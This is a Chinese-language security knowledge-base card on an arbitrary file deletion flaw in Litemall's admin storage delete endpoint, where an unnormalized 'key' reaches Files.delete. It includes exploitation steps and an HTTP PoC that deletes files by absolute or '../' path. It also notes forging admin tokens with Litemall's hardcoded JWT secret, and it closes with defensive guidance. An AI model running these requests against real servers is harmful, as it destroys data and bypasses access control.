---
id: web-java-component-litemall-storage-delete-arbitrary-file
title: Litemall 对象存储删除接口 key 未规范化导致任意文件删除
type: scenario
domain: web
path: web/java/component
technique: storage-delete-key-arbitrary-file-deletion
tags:
- java
- litemall
- spring-boot
- arbitrary-file-deletion
- path-traversal
- storage
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:19:28+08:00'
  notes: 已通读原文并逐张核对5张图：图02 CodeQL path depends on user-provided value 指向 LocalStorage.java，图03 实测 POST /admin/storage/delete 以 key=C:\Users\86138\Desktop\a.class 返回 errno:0 成功，与卡内调用链 AdminStorageController→StorageService→Files.delete 及 PoC 完全一致；图04/05 上传 HTML 同源 XSS 作为变体关联正确。原文未给受影响版本区间，卡内未写 affected_versions 合理；PoC 未在本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/java/component/web-java-component-litemall-storage-delete-arbitrary-file/
draft: false
kb_aliases:
- litemall 任意文件删除
- AdminStorageController delete 任意文件
- 对象存储 key 路径删除
- Files.delete 任意文件
---

## 一句话结论

Litemall 的 `/admin/storage/delete` 直接把请求 JSON 中的 `key` 当作文件路径交给 `Files.delete`，未做规范化或目录限制，管理员（或伪造管理员令牌者）可用绝对路径或 `../` 删除服务器上的任意文件。

## 原理

- 调用链：`AdminStorageController.delete(LitemallStorage)` 取 `litemallStorage.getKey()` → `litemallStorageService.deleteByKey(key)` → `storageService.delete(key)` → `storage.delete(keyName)` → 本地存储实现 `delete(filename)` → `Path file = load(filename); Files.delete(file);`。
- `key` 由客户端 JSON 完全控制，`load()` 未把路径限制在存储根目录，也没有 `normalize()`/`startsWith(root)` 校验；因此 `key` 既可以是绝对路径（文章用 Windows 路径 `C:\Users\...\a.class`），也可以是 `../../...` 形式的穿越路径。
- 删除动作以应用进程权限执行，能删除进程有写权限的任何文件（配置、源码、上传文件、密钥文件等），不需要文件内容可控，也不要求目标文件属于该存储。
- 接口只受 `@RequiresPermissions("admin:storage:delete")` 约束；若 JWT 密钥硬编码（Litemall 的 `JwtHelper.SECRET = "X-Litemall-Token"`），攻击者可自行签发管理员令牌，使该接口在未授权场景可达。

## 触发条件

- Litemall Admin 可访问，`/admin/storage/delete` 路由存在。
- 攻击者持有管理员令牌，或可借助硬编码 JWT 密钥伪造 `userId` 对应的管理员令牌。
- `StorageService.load(key)` 未对 key 做根目录约束，接受绝对路径或穿越序列。
- 应用进程对目标文件有删除权限。

## 利用步骤

1. 获取或伪造管理员令牌（`X-Litemall-Admin-Token`）。
2. 确认目标文件路径；Linux 常见 `/app/app.jar`、`/etc/...`、上传目录，Windows 可用绝对路径。
3. 向 `/admin/storage/delete` 发送 JSON，`key` 填入目标绝对路径或 `../` 穿越路径。
4. 观察返回 `errno:0`；再次访问或列目录确认文件已被删除。
5. 可批量删除配置/静态资源/证书等，造成业务中断或为后续利用清除障碍。

## PoC

```http
POST /admin/storage/delete HTTP/1.1
Host: target:8080
X-Litemall-Admin-Token: <admin-or-forged-token>
Content-Type: application/json

{"id":1,"key":"C:\\Users\\86138\\Desktop\\a.class","name":"2.jpg","type":"image/jpeg","size":3781}
```

```http
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8

{"errno":0,"errmsg":"成功"}
```

Linux 目标可将 `key` 换成 `/app/litemall.jar` 或 `../../app.jar` 等实际路径。

## 变体与关联

- 绝对路径与相对穿越两种形态；不同存储实现（LocalStorage/OSS/MinIO）中，key 到本地路径的映射方式不同，需按实现确认。
- 与硬编码 JWT 密钥组合：`JwtHelper.SECRET` 固定为公开字符串，可伪造管理员令牌后调用删除接口（见 JWT 硬编码密钥卡片）。
- 同项目的 `/wx/storage/upload`、`/admin/storage/create` 无扩展名校验，可上传 HTML 形成同源存储型 XSS；上传与删除常位于同一对象存储服务。
- 关联：[[web-generic-jwt-example-config-hardcoded-secret]]、[[web-generic-file-upload-weak-suffix-bypass]]。

## 检测与防御

- `key` 只作为数据库中的不透明 ID，不直接映射文件路径；若必须映射，使用 `Path.normalize()` 后校验 `startsWith(storageRoot)`，拒绝绝对路径与 `..`。
- 删除前校验文件归属（数据库记录存在且属于当前用户/租户），不要仅凭客户端 key 删除。
- 管理接口强制鉴权与最小权限；JWT 密钥改为随机生成并每环境隔离，禁止硬编码。
- 监控删除请求中带路径分隔符、绝对路径、`..` 的 key；对关键文件做备份/只读挂载，保留删除审计日志。
- 定期审计 `Files.delete`、`unlink`、`storage.delete(key)` 等调用点，确认参数来源与路径约束。
